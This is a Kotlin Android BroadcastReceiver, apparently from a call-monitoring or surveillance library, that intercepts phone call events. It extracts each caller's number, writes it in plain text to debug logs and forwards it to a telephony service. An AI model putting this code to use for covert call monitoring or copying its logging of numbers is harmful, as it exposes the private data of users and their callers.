package com.hawkshaw.library.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.hawkshaw.library.features.telephony.TelephonyCallbackService
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.utils.MiscKt.startService
import android.util.Log // Added for logging

/**
 * Broadcast receiver that intercepts phone call events
 */
class CallReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "CallReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        val intentAction = intent?.action
        val intentExtrasString = intent?.extras?.let { bundle ->
            bundle.keySet().joinToString { key -> "$key=${bundle.get(key)}" }
        } ?: "null"
        Log.d(TAG, "[DEBUG] onReceive called. Context: $context, Intent Action: \"$intentAction\", Intent Extras: {$intentExtrasString}")

        if (context != null && intent != null) {
            Log.d(TAG, "[DEBUG] onReceive: Context and Intent are not null.")
            val state = intent.getStringExtra("state")
            val phoneNumber = intent.getStringExtra("incoming_number")
            
            // Existing Logger.v call - retained for its specific formatting/purpose
            Logger.v(
                TAG,
                "OnReceive: Action: ${intent.action}, State: $state, PhoneNumber: $phoneNumber",
                false,
                4,
                null
            )
            Log.d(TAG, "[DEBUG] onReceive: Extracted - Action: \"${intent.action}\", State: \"$state\", PhoneNumber: \"$phoneNumber\"")
            
            if (phoneNumber != null) {
                Log.d(TAG, "[DEBUG] onReceive: PhoneNumber is not null (\"$phoneNumber\"). Preparing to start TelephonyCallbackService.")
                val serviceIntent = Intent(context, TelephonyCallbackService::class.java).apply {
                    action = intent.action
                    putExtra("state", state)
                    putExtra("incoming_number", phoneNumber)
                }
                Log.d(TAG, "[DEBUG] onReceive: ServiceIntent created. Action: \"${serviceIntent.action}\", Extras: {state=$state, incoming_number=$phoneNumber}")
                
                startService(serviceIntent) // Assuming MiscKt.startService handles its own logging if necessary
                Log.d(TAG, "[DEBUG] onReceive: startService(serviceIntent) called.")
            } else {
                Log.d(TAG, "[DEBUG] onReceive: PhoneNumber is null. Service not started.")
            }
        } else {
            Log.w(TAG, "[DEBUG] onReceive: Context or Intent was null. Context: $context, Intent: $intent")
        }
        Log.d(TAG, "[DEBUG] onReceive completed for action: \"$intentAction\"")
    }
}
